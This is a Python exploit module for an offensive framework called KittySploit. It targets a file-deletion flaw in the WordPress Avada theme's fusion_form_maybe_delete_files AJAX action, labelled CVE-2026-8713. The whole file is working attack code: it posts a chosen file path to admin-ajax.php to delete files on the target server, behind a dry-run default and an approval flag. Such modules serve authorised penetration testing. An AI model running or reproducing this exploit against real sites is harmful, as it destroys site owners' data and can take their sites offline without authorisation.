#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Avada CVE-2026-8713 — fusion_form_maybe_delete_files (destructive)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Avada Fusion CVE-2026-8713 file delete",
        "description": (
            "POST fusion_form_maybe_delete_files with file_path. Destructive — requires explicit path."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-8713"],
        "tags": ["wordpress", "avada", "file-delete", "cve-2026-8713"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    file_path = OptString(
        "",
        "Absolute or relative path to delete (required; never defaults to wp-config.php)",
        required=True,
    )
    dry_run = OptBool(
        True,
        "If true, only POST probe with empty path check (no delete)",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        target = (self.file_path or "").strip()
        if not target:
            print_error("file_path is required")
            return False
        if self.dry_run:
            print_warning("dry_run: skipping delete; set dry_run=false to send file_path")
            return False
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"action": "fusion_form_maybe_delete_files", "file_path": target},
            allow_redirects=False,
        )
        if resp and int(resp.status_code or 0) == 200:
            print_success("Delete AJAX returned 200")
            print_status((resp.text or "")[:400])
            return True
        print_error("Delete request failed")
        return False
